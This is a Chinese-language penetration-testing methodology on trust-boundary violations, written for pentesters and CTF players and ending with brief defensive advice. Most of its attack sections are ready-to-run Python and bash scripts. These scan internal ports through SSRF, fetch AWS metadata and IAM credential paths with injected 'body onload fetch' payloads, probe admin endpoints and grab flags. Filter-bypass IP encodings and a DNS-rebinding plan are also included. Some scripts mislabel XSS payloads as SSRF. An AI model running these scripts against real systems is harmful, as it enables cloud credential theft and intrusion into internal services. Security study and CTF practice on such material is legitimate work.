# 信任边界违规攻击方法论

## 1. 文档概述

### 1.1 编写目的
本方法论旨在为渗透测试人员提供针对**信任边界设计缺陷**进行攻击的标准化流程。重点讲解如何利用仅依赖网络隔离而无应用层认证的设计缺陷，通过 SSRF 等手段绕过信任边界访问内部服务。

### 1.2 适用范围
- 适用于 Docker 容器化部署的微服务应用
- 适用于仅依赖网络隔离而无应用层认证的系统
- 适用于存在 SSRF 漏洞且可访问内部服务的场景
- 适用于云环境元数据服务可通过 SSRF 访问的场景
- 适用于 Flask、Django、FastAPI 等 Python Web 框架应用

### 1.3 读者对象
- 执行渗透测试的安全工程师
- 进行架构安全评估的分析师
- CTF 参赛选手
- 应用安全研究人员

---

## 2. 技术专题：信任边界违规攻击

### 2.1 技术介绍

**漏洞原理：**
当应用架构设计仅依赖网络隔离（如 Docker 容器网络、VPC 网络）作为安全边界，而无应用层认证时：
1. 一旦攻击者突破网络隔离（如通过 SSRF），即可无阻碍访问内部服务
2. 内部服务通常假设"在内部网络=可信"，无认证机制
3. 敏感数据（如元数据、内部 API）可被直接访问
4. 可实施权限提升、横向移动等攻击

**本质：**
- **架构层面**：错误地将网络边界等同于信任边界
- **设计层面**：缺乏纵深防御，单一安全控制（网络隔离）
- **认证层面**：内部服务无应用层认证，仅依赖网络位置

**技术特征：**
```python
# 信任边界违规架构特征
- Docker 容器内服务无应用层认证
- 仅依赖 Docker 网络隔离作为安全控制
- 内部服务监听 localhost 或容器网络 IP
- 无认证装饰器（@login_required）
- 无 API 密钥验证
- 无 JWT/Token 验证

# 网络隔离特征
- 容器网络：10.x.x.x、172.17.x.x、172.18.x.x
- VPC 网络：10.x.x.x、192.168.x.x
- 内部服务仅监听 127.0.0.1 或内网 IP
```

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| Docker 微服务架构 | 容器化后端服务 | 容器间仅依赖网络隔离，无服务间认证 |
| 云原生应用 | AWS/GCP/Azure 部署 | 元数据服务可通过 SSRF 访问 |
| CTF 挑战环境 | 安全培训平台 | 故意设计信任边界违规供学习 |
| 内部管理系统 | 内网管理后台 | 假设内网安全而无认证 |
| API 网关架构 | 微服务 API 网关 | 网关后服务无认证，依赖网关鉴权 |
| Serverless 架构 | Lambda/Cloud Functions | 函数间调用无认证 |

### 2.3 漏洞探测方法

#### 2.3.1 网络架构侦察

**步骤 1：识别容器化部署**
```bash
# 检查响应头
curl -I http://target:38583/

# 容器化特征：
# Server: Werkzeug/1.0.1 Python/2.7.18
# 可能包含容器相关信息
```

**步骤 2：探测内部网络结构**
```bash
# 如果存在 SSRF，探测内部网络
# 测试 localhost
curl "http://target:38583/ssrf?url=http://127.0.0.1:5000/"

# 测试容器网络
curl "http://target:38583/ssrf?url=http://10.89.80.2:5000/"

# 测试常见内部端口
curl "http://target:38583/ssrf?url=http://127.0.0.1:8080/"
curl "http://target:38583/ssrf?url=http://127.0.0.1:9000/"
```

**步骤 3：识别无认证内部服务**
```bash
# 如果可访问内部服务，检查是否需要认证
curl http://internal-service:5000/admin
curl http://internal-service:5000/api/users

# 预期结果（无认证）：
# HTTP 200 OK（直接访问成功）
# 无 401 Unauthorized
# 无 302 重定向到登录页
```

#### 2.3.2 代码审计检测

**检测无认证架构：**
```python
# 搜索认证相关代码
grep -rn "@login_required\|@auth_required\|@requires_auth" /src/

# 搜索会话管理
grep -rn "session\[" /src/
grep -rn "from flask import session" /src/

# 搜索 SECRET_KEY 配置
grep -rn "secret_key\|SECRET_KEY" /src/

# 预期结果（无认证架构）：无匹配
```

**检测 SSRF 漏洞：**
```python
# 搜索 HTTP 客户端调用
grep -rn "requests\.get\|requests\.post\|urllib\.request" /src/
grep -rn "fetch\|http\.client" /src/

# 搜索 PhantomJS/无头浏览器调用
grep -rn "phantomjs\|selenium\|webdriver" /src/

# 检查 URL 验证
grep -rn "url.*validate\|validate.*url" /src/
```

#### 2.3.3 云环境检测

**AWS 元数据服务检测：**
```bash
# 如果存在 SSRF，尝试访问 AWS 元数据
curl "http://target:38583/ssrf?url=http://169.254.169.254/latest/meta-data/"

# 预期响应（AWS 环境）：
# ami-id
# instance-id
# iam/security-credentials/
```

**GCP 元数据服务检测：**
```bash
# GCP 元数据服务
curl "http://target:38583/ssrf?url=http://metadata.google.internal/computeMetadata/v1/" \
  -H "Metadata-Flavor: Google"
```

### 2.4 漏洞利用方法

#### 2.4.1 SSRF 绕过网络隔离

**场景 1：通过 SSRF 访问内部 Flask 服务**

```python
#!/usr/bin/env python3
"""
SSRF 信任边界违规攻击脚本
通过 SSRF 访问无认证的内部服务
"""

import requests

def ssrf_internal_scan(target_url, internal_ip, ports):
    """
    使用 SSRF 扫描内部服务
    """
    print(f"[*] Scanning internal network via SSRF...")
    print(f"[*] Target internal IP: {internal_ip}")

    open_ports = []

    for port in ports:
        try:
            # 构造 SSRF payload
            ssrf_url = f"http://{internal_ip}:{port}/"
            payload = {
                'url': ssrf_url
            }

            # 发送 SSRF 请求
            response = requests.post(target_url, data=payload, timeout=5)

            # 根据响应判断端口是否开放
            if response.status_code == 200 or response.status_code == 404:
                open_ports.append(port)
                print(f"[+] Port {port} OPEN - {response.status_code}")
            elif response.status_code == 429 or 'connection refused' in response.text.lower():
                print(f"[-] Port {port} CLOSED")

        except requests.exceptions.Timeout:
            print(f"[!] Port {port} TIMEOUT")
        except Exception as e:
            print(f"[!] Port {port} ERROR: {e}")

    return open_ports

def ssrf_access_internal_service(target_url, internal_url):
    """
    使用 SSRF 访问内部服务
    """
    print(f"[*] Accessing internal service: {internal_url}")

    payload = {'url': internal_url}
    response = requests.post(target_url, data=payload)

    print(f"[*] Response status: {response.status_code}")
    print(f"[*] Response length: {len(response.text)}")

    # 检查是否包含敏感信息
    sensitive_keywords = ['flag', 'secret', 'key', 'password', 'token', 'admin']
    for keyword in sensitive_keywords:
        if keyword.lower() in response.text.lower():
            print(f"[+] Found sensitive keyword: {keyword}")

    return response.text

if __name__ == "__main__":
    # 目标 SSRF 端点
    target = "http://localhost:38583/page"

    # 内部网络扫描
    common_ports = [80, 443, 5000, 8000, 8080, 8888, 9000, 9090]

    # 扫描 localhost
    print("\n=== Scanning localhost ===")
    ssrf_internal_scan(target, "127.0.0.1", common_ports)

    # 扫描容器网络
    print("\n=== Scanning container network ===")
    ssrf_internal_scan(target, "10.89.80.2", common_ports)

    # 访问内部服务
    print("\n=== Accessing internal services ===")
    ssrf_access_internal_service(target, "http://127.0.0.1:5000/admin")
    ssrf_access_internal_service(target, "http://127.0.0.1:5000/api/flag")
```

#### 2.4.2 访问云元数据服务

**场景 2：AWS 元数据服务访问**

```bash
#!/bin/bash
# AWS 元数据服务 SSRF 攻击脚本

TARGET="http://target:38583/page"

# 访问实例元数据
echo "=== Instance Metadata ==="
curl "$TARGET?name=<body%20onload=\"fetch('http://169.254.169.254/latest/meta-data/instance-id').then(r=>r.text()).then(d=>alert(d))\">"

# 访问 IAM 角色凭证
echo "=== IAM Credentials ==="
curl "$TARGET?name=<body%20onload=\"fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(d=>alert(d))\">"

# 访问用户数据
echo "=== User Data ==="
curl "$TARGET?name=<body%20onload=\"fetch('http://169.254.169.254/latest/user-data').then(r=>r.text()).then(d=>alert(d))\">"
```

**Python 版本：**
```python
#!/usr/bin/env python3
"""
AWS 元数据服务 SSRF 攻击脚本
"""

import requests
import re

def extract_aws_metadata(ssrf_endpoint):
    """
    通过 SSRF 提取 AWS 元数据
    """

    metadata_paths = [
        'latest/meta-data/instance-id',
        'latest/meta-data/ami-id',
        'latest/meta-data/iam/security-credentials/',
        'latest/meta-data/local-ipv4',
        'latest/meta-data/public-hostname',
        'latest/user-data',
    ]

    base_metadata_url = "http://169.254.169.254/"

    for path in metadata_paths:
        print(f"\n[*] Fetching: {path}")

        # 构造 XSS payload 通过 SSRF 访问
        metadata_url = base_metadata_url + path
        payload = f"<body onload=\"fetch('{metadata_url}').then(r=>r.text()).then(d=>console.log(d))\">"

        try:
            response = requests.get(ssrf_endpoint, params={'name': payload})

            # 提取元数据（实际场景中需要从响应解析）
            if 'i-' in response.text:  # EC2 实例 ID 前缀
                instance_id = re.search(r'i-[a-f0-9]+', response.text)
                if instance_id:
                    print(f"[+] Instance ID: {instance_id.group()}")

        except Exception as e:
            print(f"[!] Error fetching {path}: {e}")

if __name__ == "__main__":
    extract_aws_metadata("http://localhost:38583/page")
```

#### 2.4.3 权限提升攻击

**场景 3：通过 SSRF 访问内部管理端点**

```python
#!/usr/bin/env python3
"""
SSRF 垂直权限提升攻击脚本
通过 SSRF 访问内部管理功能实现权限提升
"""

import requests

def vertical_privilege_escalation(ssrf_endpoint, internal_admin_url):
    """
    通过 SSRF 访问内部管理端点实现权限提升
    """

    print(f"[*] Attempting vertical privilege escalation via SSRF")
    print(f"[*] Internal admin URL: {internal_admin_url}")

    # 管理端点列表
    admin_endpoints = [
        '/admin',
        '/admin/dashboard',
        '/admin/users',
        '/admin/config',
        '/api/admin/users',
        '/api/admin/config',
        '/management',
        '/actuator',
    ]

    for endpoint in admin_endpoints:
        target_url = internal_admin_url + endpoint

        print(f"\n[*] Trying: {target_url}")

        # 构造 SSRF payload
        payload = f"<body onload=\"fetch('{target_url}').then(r=>r.text()).then(d=>console.log(d))\">"

        try:
            response = requests.get(ssrf_endpoint, params={'name': payload})

            if response.status_code == 200:
                print(f"[+] Successfully accessed: {endpoint}")

                # 检查是否包含敏感信息
                if 'flag' in response.text.lower() or 'secret' in response.text.lower():
                    print(f"[+] Found sensitive data in response!")
                    print(f"    Response preview: {response.text[:200]}")

        except Exception as e:
            print(f"[!] Error accessing {endpoint}: {e}")

if __name__ == "__main__":
    ssrf_endpoint = "http://localhost:38583/page"
    internal_base = "http://127.0.0.1:5000"

    vertical_privilege_escalation(ssrf_endpoint, internal_base)
```

#### 2.4.4 组合攻击场景

**场景 4：SSRF + 无认证架构组合攻击**

```
攻击链：
1. 识别目标应用存在 SSRF 漏洞
2. 通过 SSRF 扫描内部网络，发现无认证的内部服务
3. 利用 SSRF 访问内部服务，提取敏感数据
4. 如果内部服务有管理功能，实现权限提升

具体步骤：
```

```python
#!/usr/bin/env python3
"""
SSRF + 无认证架构组合攻击脚本
"""

import requests
from urllib.parse import quote

class SSRFAttack:
    def __init__(self, ssrf_endpoint):
        self.ssrf_endpoint = ssrf_endpoint
        self.session = requests.Session()

    def scan_internal_ports(self, target_ip, ports):
        """扫描内部端口"""
        open_ports = []

        for port in ports:
            url = f"http://{target_ip}:{port}/"
            payload = f"<body onload=\"fetch('{url}').then(r=>alert('OPEN'))\">"

            try:
                response = self.session.get(self.ssrf_endpoint, params={'name': payload}, timeout=3)

                if 'OPEN' in response.text or response.status_code == 200:
                    open_ports.append(port)
                    print(f"[+] Port {port} is OPEN")

            except:
                pass

        return open_ports

    def fetch_internal_resource(self, url):
        """获取内部资源"""
        payload = f"<body onload=\"fetch('{url}').then(r=>r.text()).then(d=>alert(d))\">"

        try:
            response = self.session.get(self.ssrf_endpoint, params={'name': payload})
            return response.text
        except Exception as e:
            return f"Error: {e}"

    def extract_flag(self):
        """提取 Flag"""
        # 尝试常见 Flag 位置
        flag_paths = [
            'http://127.0.0.1:5000/flag',
            'http://127.0.0.1:5000/FLAG',
            'http://127.0.0.1:5000/flag.txt',
            'http://127.0.0.1:5000/api/flag',
            'file:///flag.txt',
            'file:///FLAG.txt',
        ]

        for path in flag_paths:
            print(f"[*] Trying to fetch: {path}")
            result = self.fetch_internal_resource(path)

            if 'FLAG{' in result or 'flag{' in result:
                print(f"[+] FLAG FOUND: {result}")
                return result

        return None

def main():
    attacker = SSRFAttack("http://localhost:38583/page")

    # 步骤 1：扫描内部端口
    print("=== Step 1: Internal Port Scan ===")
    common_ports = [80, 443, 5000, 8000, 8080, 9000]
    open_ports = attacker.scan_internal_ports("127.0.0.1", common_ports)

    # 步骤 2：提取 Flag
    print("\n=== Step 2: Extract Flag ===")
    flag = attacker.extract_flag()

    if flag:
        print(f"\n[SUCCESS] Flag captured: {flag}")
    else:
        print("\n[-] Flag not found")

if __name__ == "__main__":
    main()
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 SSRF 过滤

**IP 地址绕过：**
```python
# 如果过滤 127.0.0.1，使用其他表示方式
bypass_payloads = [
    "http://localhost:5000/",      # 使用 localhost
    "http://0.0.0.0:5000/",        # 使用 0.0.0.0
    "http://[::1]:5000/",          # 使用 IPv6
    "http://2130706433:5000/",     # 使用十进制 IP (127.0.0.1)
    "http://0177.0.0.1:5000/",     # 使用八进制 IP
    "http://0x7f.0x00.0x00.0x01:5000/",  # 使用十六进制 IP
]
```

**DNS 重绑定攻击：**
```
如果 SSRF 过滤 IP 地址，可使用 DNS 重绑定：

1. 注册域名 attacker.com
2. 配置 DNS：
   - 第一次解析：公网 IP（绕过初始检查）
   - 第二次解析：127.0.0.1（实际请求目标）
3. 利用时间差绕过 SSRF 防护
```

#### 2.5.2 绕过网络分段

**多层 SSRF 攻击：**
```
如果目标在多层网络后：

1. 第一层 SSRF：访问 DMZ 区域服务
2. 从 DMZ 服务发起第二层 SSRF：访问内部网络
3. 逐步深入，最终访问目标服务
```

---

## 3. 附录

### 3.1 常用攻击工具速查表

| 工具名称 | 用途 | 使用示例 |
|---------|------|---------|
| curl | HTTP 请求 | `curl http://target/ssrf?url=http://127.0.0.1:5000/` |
| Burp Suite | SSRF 扫描 | Scanner → SSRF 检测 |
| SSRFmap | SSRF 自动化 | `python ssrfmap.py -t target -m internal_scan` |
| Gopherus | SSRF 利用 | `python gopherus.py --exploit` |
| requests (Python) | HTTP 请求库 | 自定义 SSRF 脚本 |
| Scapy (Python) | 网络包处理 | 网络层攻击脚本 |

### 3.2 信任边界检测清单

| 检测项 | 检测方法 | 不安全标志 |
|-------|---------|-----------|
| 内部服务认证 | 直接访问内部端点 | HTTP 200 无认证 |
| 网络隔离依赖 | 架构审查 | 仅依赖 Docker/VPC 网络 |
| SSRF 漏洞 | 输入点测试 | URL 参数可控制请求 |
| 云元数据可访问 | SSRF 测试 | 可访问 169.254.169.254 |
| 容器网络暴露 | 端口扫描 | 容器网络 IP 可访问 |
| 认证装饰器缺失 | 代码审计 | 无@login_required |
| SECRET_KEY 未配置 | 代码审计 | 无 secret_key 配置 |

### 3.3 防御建议

**实施应用层认证：**
```python
# Flask 应用添加认证
from flask import Flask, session, redirect, url_for
from functools import wraps

app = Flask(__name__)
app.secret_key = 'your-secret-key'  # 配置安全密钥

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/admin')
@login_required
def admin():
    return render_template('admin.html')
```

**SSRF 防护：**
```python
# URL 验证和过滤
import socket
import ipaddress

def is_safe_url(url):
    """检查 URL 是否安全（不指向内网）"""
    from urllib.parse import urlparse
    import socket

    parsed = urlparse(url)
    hostname = parsed.hostname

    try:
        # 解析 IP 地址
        ip = socket.gethostbyname(hostname)

        # 检查是否为内网 IP
        ip_obj = ipaddress.ip_address(ip)

        # 拒绝私有 IP 和回环地址
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
            return False

        return True
    except:
        return False

# 使用示例
@app.route('/fetch')
def fetch():
    url = request.args.get('url')

    if not is_safe_url(url):
        return "Invalid URL", 400

    response = requests.get(url)
    return response.text
```

**纵深防御架构：**
```
推荐架构：
1. 网络层：VPC/容器网络隔离
2. 认证层：所有服务实施认证（JWT/API Key/mTLS）
3. 授权层：细粒度权限控制
4. 监控层：异常访问检测和告警
```

---

**文档版本：** 1.0
**最后更新：** 2026 年 3 月
**适用场景：** 渗透测试、安全评估、CTF 挑战
